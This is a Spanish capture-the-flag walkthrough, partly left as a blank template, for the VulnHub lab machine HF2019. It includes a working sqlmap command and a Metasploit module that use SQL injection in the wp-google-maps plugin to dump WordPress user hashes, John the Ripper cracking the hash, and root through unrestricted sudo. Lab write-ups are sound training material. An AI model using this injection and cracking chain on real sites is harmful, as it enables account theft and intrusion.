# 🖥️ Walkthrough Template - VulnHub Machine

## 📋 Información de la Máquina

| Campo | Detalle |
|-------|---------|
| **Nombre** | `HF2019` |
| **Plataforma** | VulnHub |
| **Dificultad** | `Fácil / Media` |
| **Sistema Operativo** | `Linux` |
| **Fecha de resolución** | `2026-11-15` |
| **Autor** | `Edgerunner` |

---

## 🎯 Objetivo

> Obtención de de flags y escalamiento de privilegios

**Flags objetivo:**
- [ x ] `user.txt`
- [ x ] `root.txt`

---

## 🔍 Reconocimiento

### 1. Identificación de IP

```bash
# Descubrimiento de hosts en la red
arp-scan -l
# o
netdiscover -r 192.168.1.0/24
# o
nmap -sn 192.168.1.0/24

# escaneo de red
sudo arp-scan -I wlan0 --localnet

ping -c 1 192.168.1.9 # verificar si esta prendida la maquina
```

**IP objetivo:** `192.168.1.9`

---

### 2. Escaneo de puertos

```bash
# Escaneo de puertos
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.9 -oG allPorts

# Busqueda de vulnerabilidades
sudo nmap -sCV -p21,22,80 192.168.1.9 -oN webScan 
```

**Puertos abiertos encontrados:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| `22/tcp` | SSH | OpenSSH X.X |
| `80/tcp` | HTTP | Apache X.X |
| `...` | ... | ... |

---

### 3. Enumeración de servicios

#### 🌐 HTTP (Puerto 80)

```bash
# Tecnologías : Wordpress
# Se usa wp-scan para buscar las vulnerabilidades de la página
[+] URL: http://192.168.1.9/ [192.168.1.9]
[+] Started: Sun Nov 15 17:43:11 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.9/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.1.9/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.1.9/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.9/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.1.9/?feed=rss2, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://192.168.1.9/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://192.168.1.9/wp-content/themes/twentyseventeen/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://192.168.1.9/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 4.1
 | Style URL: http://192.168.1.9/wp-content/themes/twentyseventeen/style.css?ver=5.2.3
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.9/wp-content/themes/twentyseventeen/style.css?ver=5.2.3, Match: 'Version: 2.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-google-maps
 | Location: http://192.168.1.9/wp-content/plugins/wp-google-maps/
 | Latest Version: 10.1.12
 | Last Updated: 2026-11-13T17:14:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | The version could not be determined.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=============> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Nov 15 17:43:15 2026
[+] Requests Done: 178
[+] Cached Requests: 5
[+] Data Sent: 43.659 KB
[+] Data Received: 415.57 KB
[+] Memory used: 287.824 MB
[+] Elapsed time: 00:00:04

```

**Hallazgos:**
- Se encuentra vulnerabilidad en un plugin de google maps
- 

#### 🔐 SSH (Puerto 22)

```bash
# Verificar banner
nc -nv 192.168.X.X 22
```

**Hallazgos:**
- 

#### 📁 SMB / FTP / otros

```bash
# SMB
smbclient -L //192.168.X.X
enum4linux -a 192.168.X.X

# FTP
ftp 192.168.X.X
```

**Hallazgos:**
- 

---

## 🚪 Explotación

### Vector de entrada

> Se busca el exploit de la vulnerabilidad de google maps para hacer SQLI

```bash
# Se busca el exploit en searchsploit
searchsploit maps

```

```bash
# Comando / script de explotación
# Usando SQL Map
sqlmap -u "http://192.168.1.9/index.php?rest_route=/wpgmza/v1/markers/&filter={}&fields=*" -p fields --level=2 --risk=1 --batch --dump -T wp_users

# Usando Metasploit
msfconsole
search wp_google_maps
use auxiliary/admin/http/wp_google_maps_sqli
set RHOSTS 192.168.1.9
run

# ANS sqlmap
[18:13:47] [WARNING] no clear password(s) found                                            
Database: wordpress
Table: wp_users
[1 entry]
+----+----------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url | user_pass                          | user_email           | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | <blank>  | $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 | webmaster@none.local | webmaster  | 0           | webmaster    | webmaster     | 2019-09-09 12:54:30 | <blank>             |
+----+----------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

# ANS metasploit
[+] 192.168.1.9:80 - Found webmaster $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 webmaster@none.local
[*] Auxiliary module execution completed

```

**Resultado:**
- Se obtiene el usuario webmaster y un hash para conocer la contraseña


---

## 🔑 Acceso inicial (User)

### Obtención de shell

```bash
# Comando utilizado
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# ANS
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
kittykat1        (?)     
1g 0:00:00:00 DONE (2026-11-15 18:32) 4.347g/s 46747p/s 46747c/s 46747C/s sandara..bless
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.

# pass: kittykat1

ssh webmaster@192.168.1.9


```

**Shell obtenida como:** `www-data / usuario`

### Estabilización de la shell

```bash
# TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Flag de usuario

```bash
cat /home/<usuario>/user.txt
```

> **Flag:** `83cad236438ff0c0dbce55d7f0034aee18f5c39e`

---

## ⬆️ Escalada de Privilegios

### Enumeración

```bash
# Info del sistema
uname -a
cat /etc/os-release
id
sudo -l

# ANS
[sudo] password for webmaster: 
Sorry, try again.
[sudo] password for webmaster: 
Matching Defaults entries for webmaster on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User webmaster may run the following commands on localhost:
    (ALL) ALL

# SUID
find / -perm -4000 -type f 2>/dev/null

# Cron
cat /etc/crontab
ls -la /etc/cron*

# Capabilities
getcap -r / 2>/dev/null

# Servicios
ps aux
netstat -tulpn

# Kernel exploits
searchsploit "Linux Kernel X.X"
```

### Scripts automáticos

```bash
# LinPEAS
./linpeas.sh

# Linux Smart Enumeration
./lse.sh -l 2
```

**Hallazgos clave:**
- El usuario webmaster puede correr cualquier comando como root
- 

---

### Escalada

> Al poder ejecutar cualquier comando como root solo se hace el cambio a su

```bash
# Comandos utilizados
sudo su
```

**Root obtenido:** ✅

### Flag de root

```bash
cat /root/root.txt
```

> **Flag:** `3dcdf93d2976321d7a8c47a6bb2d48837d330624`

---

## 📝 Resumen / Lecciones Aprendidas

### Vulnerabilidades explotadas
1. 
2. 
3. 

### Herramientas utilizadas
- `nmap`
- `gobuster`
- `...`

### Notas / Tips
- 
- 

---

## 📚 Referencias

- [Enlace CVE](https://nvd.nist.gov/)
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks](https://book.hacktricks.xyz/)
- 

---

> ✍️ *Walkthrough realizado por [Edgerunner] - [15/11/2026]*